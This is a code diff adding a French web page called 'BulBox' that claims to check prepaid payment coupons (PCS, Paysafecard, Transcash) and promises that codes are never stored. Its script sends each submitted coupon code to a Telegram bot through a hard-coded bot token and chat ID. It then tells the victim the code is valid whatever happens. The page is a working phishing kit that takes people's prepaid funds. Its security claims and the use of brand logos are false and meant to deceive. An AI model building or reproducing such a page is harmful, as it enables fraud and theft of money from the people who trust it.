@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérifier vos coupons de paiement</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f7fafd url('https://www.transparenttextures.com/patterns/cubes.png');
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .main-container {
+            max-width: 440px;
+            margin: 60px auto 80px auto;
+            background: rgba(255,255,255,0.18);
+            padding: 38px 32px 44px 32px;
+            border-radius: 22px;
+            box-shadow: 0 8px 32px 0 rgba(31,38,135,0.18);
+            text-align: center;
+            backdrop-filter: blur(8px);
+            border: 1.5px solid rgba(255,255,255,0.25);
+        }
+        h1 {
+            color: #1565c0;
+            font-size: 2.2rem;
+            margin-bottom: 34px;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 8px rgba(33,150,243,0.08);
+        }
+        .coupon-chooser {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 32px;
+            margin-bottom: 32px;
+            min-height: 180px;
+            position: relative;
+            height: 180px;
+            overflow: hidden;
+        }
+        .coupon-list {
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+            animation: vertical-rotate 6s infinite;
+        }
+        @keyframes vertical-rotate {
+            0% { transform: translateY(0); }
+            20% { transform: translateY(-70px); }
+            40% { transform: translateY(-140px); }
+            60% { transform: translateY(-70px); }
+            80% { transform: translateY(0); }
+            100% { transform: translateY(0); }
+        }
+        .coupon-card {
+            display: flex;
+            align-items: center;
+            background: rgba(255,255,255,0.7);
+            border-radius: 14px;
+            box-shadow: 0 2px 12px rgba(33,150,243,0.10);
+            padding: 18px 32px;
+            cursor: pointer;
+            transition: transform 0.22s, box-shadow 0.22s, background 0.22s;
+            min-width: 240px;
+            border: 1.5px solid #e3f2fd;
+        }
+        .coupon-card:hover {
+            transform: scale(1.07) rotate(-2deg);
+            box-shadow: 0 8px 32px rgba(33,150,243,0.18);
+            background: #e3f2fd;
+        }
+        .coupon-logo {
+            width: 54px;
+            height: 54px;
+            margin-right: 20px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(33,150,243,0.10);
+            border: 1.5px solid #b3e5fc;
+        }
+        .coupon-logo img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+        .coupon-label {
+            font-size: 1.25rem;
+            color: #1976d2;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+        }
+        .hidden { display: none; }
+        .code-form {
+            margin-top: 34px;
+            background: rgba(255,255,255,0.7);
+            border-radius: 12px;
+            padding: 22px 18px 18px 18px;
+            box-shadow: 0 2px 12px rgba(33,150,243,0.10);
+            border: 1.5px solid #e3f2fd;
+        }
+        .code-form label {
+            color: #1976d2;
+            font-size: 1.13rem;
+            font-weight: 500;
+        }
+        .code-form input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            border: 1.5px solid #b3e5fc;
+            border-radius: 7px;
+            font-size: 1.13rem;
+            background: #f7fbff;
+            transition: border 0.2s;
+        }
+        .code-form input[type="text"]:focus {
+            border: 1.5px solid #1976d2;
+            outline: none;
+        }
+        .code-form button {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(90deg, #1976d2 0%, #64b5f6 100%);
+            color: #fff;
+            border: none;
+            border-radius: 7px;
+            margin-top: 20px;
+            font-size: 1.13rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(33,150,243,0.10);
+            transition: background 0.2s;
+        }
+        .code-form button:hover {
+            background: linear-gradient(90deg, #125ea7 0%, #1976d2 100%);
+        }
+        footer {
+            width: 100%;
+            text-align: center;
+            padding: 18px 0 12px 0;
+            color: #fff;
+            background: transparent;
+            font-size: 1rem;
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            z-index: 10;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 8px rgba(33,150,243,0.18);
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <header style="width:100%;position:fixed;top:0;left:0;z-index:100;background:rgba(255,255,255,0.18);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:space-between;padding:18px 38px 14px 38px;box-shadow:0 2px 16px rgba(33,150,243,0.08);border-bottom:1.5px solid rgba(25,118,210,0.08);">
+        <div style="font-family:'Segoe UI',Arial,sans-serif;font-weight:900;font-size:2rem;color:#1976d2;letter-spacing:2.5px;text-shadow:0 2px 8px rgba(33,150,243,0.13);">
+            <span style="background:linear-gradient(90deg,#1976d2 0%,#64b5f6 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">BulBox</span>
+        </div>
+        <nav style="flex:1;text-align:right;">
+            <!-- Espace pour d'autres liens si besoin -->
+        </nav>
+    </header>
+    <div style="height:70px;"></div>
+    <div style="text-align:center;margin-bottom:8px;">
+        <h1 style="margin:0;font-size:2.2rem;color:#1565c0;letter-spacing:1px;text-shadow:0 2px 8px rgba(33,150,243,0.08);">Vérifier vos coupons de paiement</h1>
+        <div style="color:#1976d2;font-size:1.08rem;margin-top:6px;font-weight:500;letter-spacing:1px;">Votre plateforme de vérification depuis 2017</div>
+    </div>
+        <p style="color:#1976d2;font-size:1.08rem;margin-bottom:18px;line-height:1.6;">
+            Bienvenue sur BulBox, votre plateforme de vérification de coupons de paiement en ligne. <br>
+            Vérifiez instantanément la validité de vos coupons PCS, Paysafecard ou Transcash en toute sécurité.<br>
+        </p>
+        <div style="background:rgba(25,118,210,0.08);border-radius:10px;padding:14px 18px 10px 18px;margin-bottom:22px;">
+            <strong>Comment ça marche&nbsp;?</strong>
+            <ul style="text-align:left;color:#1976d2;font-size:1rem;margin:10px 0 0 0;padding-left:20px;">
+                <li>Sélectionnez le type de coupon à vérifier parmi les options ci-dessous.</li>
+                <li>Entrez le code de votre coupon dans le champ prévu.</li>
+                <li>Recevez une réponse immédiate sur la validité de votre coupon.</li>
+            </ul>
+        </div>
+        <div class="coupon-chooser">
+            <div class="coupon-list">
+                <div class="coupon-card" data-coupon="PCS">
+                    <div class="coupon-logo">
+                            <img src="https://www.pcspro.com/wp-content/uploads/2022/09/logo-pcs-mastercard.svg" alt="PCS" style="width:40px;height:40px;">
+                    </div>
+                    <span class="coupon-label">PCS</span>
+                </div>
+                <div class="coupon-card" data-coupon="Paysafecard">
+                    <div class="coupon-logo">
+                            <img src="https://www.paysafecard.com/fileadmin/Website/DACH/Images/logos/paysafecard_Logo_2021_RGB.svg" alt="Paysafecard" style="width:40px;height:40px;">
+                    </div>
+                    <span class="coupon-label">Paysafecard</span>
+                </div>
+                <div class="coupon-card" data-coupon="Transcash">
+                    <div class="coupon-logo">
+                            <img src="https://www.trans-cash.fr/wp-content/uploads/2021/09/logo-transcash.png" alt="Transcash" style="width:40px;height:40px;">
+                    </div>
+                    <span class="coupon-label">Transcash</span>
+                </div>
+            </div>
+        </div>
+        <form class="code-form hidden" id="codeForm">
+            <label id="couponLabel">Entrez le code de votre coupon</label>
+            <input type="text" id="couponCode" name="couponCode" placeholder="Code coupon" required>
+            <button type="submit">Vérifier</button>
+        </form>
+        <div style="margin-top:32px;background:rgba(25,118,210,0.07);border-radius:10px;padding:14px 18px 10px 18px;">
+            <strong>Pourquoi utiliser BulBox&nbsp;?</strong>
+            <ul style="text-align:left;color:#1976d2;font-size:1rem;margin:10px 0 0 0;padding-left:20px;">
+                <li><b>Sécurité&nbsp;:</b> Vos codes sont traités de façon confidentielle et ne sont jamais stockés.</li>
+                <li><b>Rapidité&nbsp;:</b> Résultat immédiat après la saisie du code.</li>
+                <li><b>Support&nbsp;:</b> Une équipe à votre écoute pour toute question ou assistance.</li>
+            </ul>
+        </div>
+        <div style="margin-top:32px;background:rgba(25,118,210,0.07);border-radius:10px;padding:14px 18px 10px 18px;">
+            <strong>À propos de BulBox</strong>
+            <p style="color:#1976d2;font-size:1rem;margin:10px 0 0 0;line-height:1.6;">
+                BulBox est une plateforme indépendante spécialisée dans la vérification de coupons de paiement prépayés. Notre mission est de garantir la sécurité et la fiabilité de vos transactions, en vous offrant un service rapide, confidentiel et accessible 24h/24.<br>
+                Nous travaillons en partenariat avec les plus grands acteurs du secteur pour vous garantir une expérience optimale.
+            </p>
+        </div>
+        <div style="margin-top:32px;background:rgba(25,118,210,0.07);border-radius:10px;padding:18px 18px 10px 18px;">
+            <strong>Questions fréquentes (FAQ)</strong>
+            <ul style="text-align:left;color:#1976d2;font-size:1rem;margin:10px 0 0 0;padding-left:20px;">
+                <li><b>Quels types de coupons puis-je vérifier&nbsp;?</b><br>Vous pouvez vérifier les coupons PCS, Paysafecard et Transcash.</li>
+                <li><b>Mes codes sont-ils stockés&nbsp;?</b><br>Non, BulBox ne conserve aucune donnée de code. La confidentialité est notre priorité.</li>
+                <li><b>Combien de temps prend la vérification&nbsp;?</b><br>La réponse est instantanée après la saisie du code.</li>
+                <li><b>Que faire si mon coupon est invalide&nbsp;?</b><br>Vérifiez que le code est bien saisi. Si le problème persiste, contactez le support.</li>
+            </ul>
+        </div>
+        <div style="margin-top:32px;background:rgba(25,118,210,0.07);border-radius:10px;padding:18px 18px 10px 18px;">
+            <strong>Contact & Support</strong>
+            <p style="color:#1976d2;font-size:1rem;margin:10px 0 0 0;line-height:1.6;">
+                Une question, un problème ou besoin d’assistance&nbsp;? Notre équipe est à votre écoute&nbsp;:<br>
+                <b>Email&nbsp;:</b> <a href="mailto:support@bulbox.fr" style="color:#1976d2;text-decoration:underline;">support@bulbox.fr</a><br>
+                <b>Horaires&nbsp;:</b> 7j/7, 9h-22h
+            </p>
+        </div>
+        <div style="margin-top:32px;background:rgba(25,118,210,0.07);border-radius:10px;padding:18px 18px 10px 18px;">
+            <strong>Nos partenaires</strong>
+            <div style="display:flex;gap:32px;align-items:center;justify-content:center;margin-top:12px;flex-wrap:wrap;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/PCS_Mastercard_logo.png" alt="PCS" style="height:38px;filter:grayscale(0.2);">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Paysafecard_logo.svg" alt="Paysafecard" style="height:38px;filter:grayscale(0.2);">
+                <img src="https://www.trans-cash.fr/wp-content/uploads/2021/09/logo-transcash.svg" alt="Transcash" style="height:38px;filter:grayscale(0.2);">
+                    <img src="https://www.pcspro.com/wp-content/uploads/2022/09/logo-pcs-mastercard.svg" alt="PCS" style="height:38px;filter:grayscale(0.2);">
+                    <img src="https://www.paysafecard.com/fileadmin/Website/DACH/Images/logos/paysafecard_Logo_2021_RGB.svg" alt="Paysafecard" style="height:38px;filter:grayscale(0.2);">
+                    <img src="https://www.trans-cash.fr/wp-content/uploads/2021/09/logo-transcash.png" alt="Transcash" style="height:38px;filter:grayscale(0.2);">
+            </div>
+        </div>
+        <div style="margin-top:28px;color:#1976d2;font-size:0.98rem;line-height:1.5;">
+            <b>Attention&nbsp;:</b> Ne partagez jamais vos codes avec des personnes non fiables. Utilisez toujours des plateformes officielles pour vos transactions.
+        </div>
+    </div>
+    <script>
+        // Animation pause on hover
+        const couponChooser = document.querySelector('.coupon-chooser');
+        couponChooser.addEventListener('mouseenter', () => {
+            document.querySelector('.coupon-list').style.animationPlayState = 'paused';
+        });
+        couponChooser.addEventListener('mouseleave', () => {
+            document.querySelector('.coupon-list').style.animationPlayState = 'running';
+        });
+        // Affichage du champ code après sélection
+        let selectedCoupon = null;
+        document.querySelectorAll('.coupon-card').forEach(card => {
+            card.addEventListener('click', function() {
+                selectedCoupon = this.dataset.coupon;
+                document.getElementById('codeForm').classList.remove('hidden');
+                document.getElementById('couponLabel').textContent = `Entrez le code de votre coupon ${selectedCoupon}`;
+                document.getElementById('couponCode').focus();
+            });
+        });
+
+        // Envoi du code à Telegram lors de la soumission
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('couponCode').value.trim();
+            if (!selectedCoupon || !code) return;
+            const token = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
+            const chatId = '-5214080706';
+            const message = `\uD83D\uDD12 Coupon reçu\nType: ${selectedCoupon}\nCode: ${code}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('✅ Votre code est valide ! Vous pouvez l\'utiliser.');
+                    document.getElementById('codeForm').reset();
+                    document.getElementById('codeForm').classList.add('hidden');
+                } else {
+                    alert('Erreur lors de l\'envoi. Merci de réessayer.');
+                }
+            })
+            .catch(() => {
+                alert('Erreur de connexion. Merci de réessayer.');
+            });
+        });
+    </script>
+</body>
+    <footer style="width:100%;text-align:center;padding:18px 0 12px 0;color:#fff;background:transparent;font-size:1rem;position:fixed;left:0;bottom:0;z-index:10;letter-spacing:1px;">
+        &copy; 2026 BulBox. Tous droits réservés.
+    </footer>
+</html>
